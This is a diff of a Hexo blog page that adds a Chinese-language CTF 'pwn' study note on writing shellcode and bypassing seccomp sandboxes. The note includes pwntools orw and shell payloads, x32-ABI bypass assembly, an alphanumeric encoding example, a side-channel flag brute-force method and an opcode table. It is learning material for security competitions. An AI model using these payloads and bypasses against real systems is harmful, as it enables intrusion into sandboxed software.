@@ -159,6 +159,182 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/23/shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/23/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-23 23:33:59 / 修改时间：23:41:11" itemprop="dateCreated datePublished" datetime="2023-09-23T23:33:59+08:00">2023-09-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>780</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一些考点"><a href="#一些考点" class="headerlink" title="一些考点"></a>一些考点</h1><h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><h3 id="常规orw"><a href="#常规orw" class="headerlink" title="常规orw"></a>常规orw</h3><p>要注意常规orw和调用elf里面的open函数不一样，elf里面的实质上是openat函数</p>
+<p>jihe<br>这个时候要找gadgets控制寄存器，然后再找syscall；ret这种gadgets</p>
+<p>ROPgadget 加上 –multibr就能找这种gadgets</p>
+<p>生成方式：</p>
+<p>1.shellcraft配合函数生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">orw_shellcode</span>():</span><br><span class="line">    payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">    payload+=shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload+=shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">    payload=asm(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>2.shellcraft自带sh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+
+<p>3.网上payload</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes (exploit-db.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/114106118">pwn题shellcode收集_pyiiiiiiiiiiqzvtx30vx4ap0a3hh0a00abaabtaaq2ab2bb0b___lifanxin的博客-CSDN博客</a></p>
+<h3 id="使用未限制函数"><a href="#使用未限制函数" class="headerlink" title="使用未限制函数"></a>使用未限制函数</h3><p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Chromium OS Docs - Linux System Call Table (googlesource.com)</a></p>
+<p>可以参考这个链接使用平替函数</p>
+<ul>
+<li>seccomp黑名单<ul>
+<li>execve→execveat</li>
+<li>open→openat</li>
+<li>read→readv, pread64, preadv, preadv2</li>
+<li>write→writev, pwrite64, pwritev, pwritev2</li>
+</ul>
+</li>
+<li>read和write都禁止了还可以用sendfile</li>
+</ul>
+<h3 id="x32-abi绕过"><a href="#x32-abi绕过" class="headerlink" title="x32 abi绕过"></a>x32 abi绕过</h3><p>本质是调用32位下的函数，仍能使用</p>
+<p>利用条件为 没有限制sys_number&lt;0x40000000</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">lea rax,[rip]</span><br><span class="line">add rax,<span class="number">0x200</span></span><br><span class="line">mov rsp,rax ;  因为rsp被清空，先将栈迁移至可读写位置</span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">0x67616c66</span> ;  <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mov rax,<span class="number">0x40000002</span> ;  <span class="built_in">open</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rax,rsp</span><br><span class="line">add rax,<span class="number">0x100</span></span><br><span class="line">mov rsi,rax</span><br><span class="line">mov rdx,<span class="number">0x40</span></span><br><span class="line">mov rax,<span class="number">0x40000000</span> ;  read</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edi,<span class="number">2</span></span><br><span class="line">mov rax,<span class="number">0x40000001</span> ;  write</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构切换绕过"><a href="#架构切换绕过" class="headerlink" title="架构切换绕过"></a>架构切换绕过</h3><p>进入32位模式</p>
+<p>利用条件：</p>
+<ul>
+<li>沙箱中不包含对arch&#x3D;&#x3D;ARCH_x86_64的检测</li>
+<li>存在或可构造32位地址的RWX内存段</li>
+</ul>
+<h3 id="进入32位模式"><a href="#进入32位模式" class="headerlink" title="进入32位模式"></a><strong>进入32位模式</strong></h3><p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。</p>
+<h3 id="ptrace绕过"><a href="#ptrace绕过" class="headerlink" title="ptrace绕过"></a>ptrace绕过</h3><ul>
+<li>ptrace在老版本的linux（before 4.8）上能绕过seccomp</li>
+<li>even ubuntu 18 kernel version is 5.3</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.notion.so/">https://www.notion.so</a></p>
+<h2 id="更多限制绕过"><a href="#更多限制绕过" class="headerlink" title="更多限制绕过"></a>更多限制绕过</h2><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ol>
+<li>手写&#x2F;修改shellcode</li>
+<li>使用exx寄存器</li>
+<li>使用push+pop代替mov+立即数</li>
+<li>使用xor xxx 代替mov 0</li>
+<li>现成代码</li>
+</ol>
+<p>或者用最爱的再read一次</p>
+<h3 id="IO流绕过"><a href="#IO流绕过" class="headerlink" title="IO流绕过"></a>IO流绕过</h3><p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
+<p>关掉了某些流</p>
+<p>可以尝试从这些流读取 stdin stderr</p>
+<h3 id="手搓shellcode"><a href="#手搓shellcode" class="headerlink" title="手搓shellcode"></a>手搓shellcode</h3><p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec</a></p>
+<p>这篇文章有机器码对应汇编</p>
+<h3 id="限制可见字符"><a href="#限制可见字符" class="headerlink" title="限制可见字符"></a>限制可见字符</h3><p>ae64工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64">https://github.com/veritas501/ae64</a></p>
+<p>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h3><ul>
+<li>依次爆破flag中每个字符<ul>
+<li>不同 &#x3D;&gt; 死循环 &#x3D;&gt; TCP连接保持</li>
+<li>相同 &#x3D;&gt; 程序退出 &#x3D;&gt; TCP连接断开</li>
+</ul>
+</li>
+<li>pwntools判断断开：<ul>
+<li>io.connected()</li>
+<li>send之后except (BrokenPipeError, EOFError):</li>
+</ul>
+</li>
+</ul>
+<h1 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h1><p>编译命令gcc .&#x2F;xxx.c -o .&#x2F;xxx -lseccomp -no-pie</p>
+<h1 id="x64"><a href="#x64" class="headerlink" title="x64:"></a>x64:</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>syscall 0x0f 0x05</p>
+<h2 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h2><p>jmp rax 0xff 0xe0</p>
+<p>jmp rbx 0xff 0xe3</p>
+<p>jmp rcx 0xff 0xe1</p>
+<p>jmp rdx 0xff 0xe2</p>
+<p>jmp rdi 0xff 0xe7</p>
+<p>jmp rsi 0xff 0xe6</p>
+<h2 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h2><p>push rax 0x50</p>
+<p>push rbx 0x53</p>
+<p>push rcx 0x51</p>
+<p>push rdx 0x52</p>
+<p>push rdi 0x57</p>
+<p>push rsi 0x56</p>
+<p>pop rax 0x58</p>
+<p>pop rbx 0x5B</p>
+<p>pop rcx 0x59</p>
+<p>pop rdx 0x5A</p>
+<p>pop rdi 0x5F</p>
+<p>pop rsi 0x5E</p>
+<h2 id="Mov"><a href="#Mov" class="headerlink" title="Mov"></a>Mov</h2><p>mov比较多 得具体问题具体分析</p>
+<h2 id="加减乘除"><a href="#加减乘除" class="headerlink" title="加减乘除"></a>加减乘除</h2><p>这个也比较多，得具体问题具体分析</p>
+<h3 id="交换寄存器"><a href="#交换寄存器" class="headerlink" title="交换寄存器"></a>交换寄存器</h3><p>xchg</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/20/chunk-overlap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -421,20 +597,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -479,13 +655,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">36k</span>
+    <span title="站点总字数">37k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:12</span>
+    <span title="站点阅读时长">2:16</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
